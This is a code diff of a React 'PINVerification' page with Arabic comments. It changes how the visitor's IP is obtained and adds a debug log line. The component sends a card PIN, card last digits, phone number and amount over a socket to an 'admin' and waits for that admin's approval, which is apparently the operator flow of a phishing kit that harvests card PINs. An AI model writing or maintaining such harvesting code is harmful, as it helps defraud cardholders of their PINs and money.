@@ -5,7 +5,7 @@ import { useSocket } from '../context/SocketContext';
 export default function PINVerification() {
   const navigate = useNavigate();
   const location = useLocation();
-  const { socket } = useSocket();
+  const { socket, userIp } = useSocket();
   
   const { pinCode, cardLastDigits, phoneNumber, amount } = location.state || {};
   
@@ -20,14 +20,11 @@ export default function PINVerification() {
       return;
     }
 
-    // الحصول على IP الخاص بالمستخدم
-    const userIP = sessionStorage.getItem('userIP');
-
     // الاستماع لرد الأدمن
     if (socket) {
       // إرسال رمز PIN للأدمن عبر Socket
       socket.emit('newPIN', {
-        ip: userIP,
+        ip: userIp,
         pinCode,
         cardLastDigits,
         phoneNumber,
@@ -37,9 +34,10 @@ export default function PINVerification() {
 
       socket.on('pinVerificationStatus', (data) => {
         console.log('🔑 PIN verification status received:', data);
+        console.log('🔍 Current user IP:', userIp, 'Message IP:', data.ip);
         
         // التحقق من أن الرسالة موجهة لهذا المستخدم فقط
-        if (data.ip && data.ip !== userIP) {
+        if (data.ip && data.ip !== userIp) {
           console.log('⚠️ PIN status not for this user, ignoring');
           return;
         }
